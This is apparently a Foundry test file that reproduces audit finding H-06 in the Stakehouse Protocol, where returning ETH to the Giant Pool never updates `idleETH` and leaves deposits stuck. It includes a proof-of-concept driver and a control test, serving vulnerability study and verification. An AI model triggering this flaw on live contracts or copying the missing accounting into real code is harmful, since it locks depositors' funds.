// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./43029-h-06-bringunusedethbackintogiantpool-can-cause-stuck-ether-f.sol";

/*//////////////////////////////////////////////////////////////
    Stakehouse Protocol — `bringUnusedETHBackIntoGiantPool` can cause stuck
    ether funds in the Giant Pool (H-06, #43029)

    `GiantMevAndFeesPool.bringUnusedETHBackIntoGiantPool` returns ETH from a
    staking funds vault into the Giant Pool's balance but never increments
    `idleETH` — the only accounting variable `withdrawETH` checks. The
    returned ETH sits in the contract forever, invisible to withdrawal.

    - test_exploit: drives the cheatcode-free Exploit end to end (funded via
      msg.value), then re-asserts the stuck-funds harm from the driver.
    - test_stuckFundsStandalone: rebuild mirroring the finding's own PoC shape
      with EOAs.
    - test_control_withdrawWorksBeforeStaking: control — withdrawing straight
      from idle deposits (no stake/bring-back round-trip) works fine, isolating
      the missing `idleETH += amount` as the defect.
//////////////////////////////////////////////////////////////*/
contract GiantPoolStuckFundsTest is Test {
    /// @notice HARM via the self-contained Exploit: ETH returned from a vault
    ///         is stuck because idleETH never accounts for it.
    function test_exploit() public {
        Exploit e = new Exploit();
        e.run{value: e.DEPOSIT_AMOUNT()}();

        GiantMevAndFeesPool pool = e.pool();
        StakingFundsVault vault = e.vault();

        // Re-assert the HARM independently from the driver.
        assertEq(address(pool).balance, e.DEPOSIT_AMOUNT(), "pool physically holds the ETH again");
        assertEq(pool.idleETH(), 0, "idleETH never caught up with the returned ETH");
        assertEq(address(vault).balance, 0, "vault paid everything back");

        uint256 depositAmount = e.DEPOSIT_AMOUNT();
        vm.prank(address(e)); // Exploit itself is the depositor holding giant LP
        vm.expectRevert("Come back later or withdraw less ETH");
        pool.withdrawETH(depositAmount);
    }

    /// @notice Standalone rebuild with an EOA depositor, mirroring the
    ///         finding's PoC shape (deposit -> stake -> bring back -> stuck).
    function test_stuckFundsStandalone() public {
        GiantMevAndFeesPool pool = new GiantMevAndFeesPool();
        StakingFundsVault vault = new StakingFundsVault();

        address depositor = makeAddr("depositor");
        vm.deal(depositor, 1 ether);

        vm.startPrank(depositor);
        pool.depositETH{value: 1 ether}(1 ether);
        vm.stopPrank();

        assertEq(pool.idleETH(), 1 ether);

        pool.depositETHForStakingViaVault(vault, 1 ether);
        assertEq(pool.idleETH(), 0);
        assertEq(address(vault).balance, 1 ether);

        // Staking never commenced; bring the ETH back.
        pool.bringUnusedETHBackIntoGiantPool(vault, 1 ether);
        assertEq(address(pool).balance, 1 ether, "pool holds the ETH again");
        assertEq(pool.idleETH(), 0, "idleETH bug: stuck at 0");

        vm.startPrank(depositor);
        vm.expectRevert("Come back later or withdraw less ETH");
        pool.withdrawETH(1 ether);
        vm.stopPrank();
    }

    /// @notice Control: a depositor who never stakes (no bring-back round
    ///         trip) can withdraw normally — isolating the missing
    ///         `idleETH += amount` in `bringUnusedETHBackIntoGiantPool` as the
    ///         defect, not `withdrawETH` itself.
    function test_control_withdrawWorksBeforeStaking() public {
        GiantMevAndFeesPool pool = new GiantMevAndFeesPool();

        address depositor = makeAddr("depositor2");
        vm.deal(depositor, 1 ether);

        vm.startPrank(depositor);
        pool.depositETH{value: 1 ether}(1 ether);
        assertEq(pool.idleETH(), 1 ether);

        pool.withdrawETH(1 ether);
        vm.stopPrank();

        assertEq(pool.idleETH(), 0);
        assertEq(depositor.balance, 1 ether, "depositor got their ETH back with no round-trip");
    }
}
